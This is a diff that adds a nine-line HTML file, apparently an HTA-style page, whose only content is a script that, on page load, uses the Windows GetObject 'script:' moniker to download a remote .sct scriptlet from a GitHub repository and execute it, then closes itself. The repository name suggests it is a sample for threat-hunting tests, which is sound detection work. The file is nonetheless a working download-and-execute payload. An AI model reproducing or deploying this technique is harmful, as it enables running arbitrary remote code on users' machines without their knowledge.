@@ -1,0 +1,9 @@
+<HTML> 
+<HEAD> 
+<script language="javascript">
+    a=(GetObject('script:https://raw.githubusercontent.com/0xMo/TestThreatHunting/main/SCT%20files/PS1.sct')).Exec();close();
+</script>
+</HEAD> 
+<BODY> 
+</BODY> 
+</HTML>
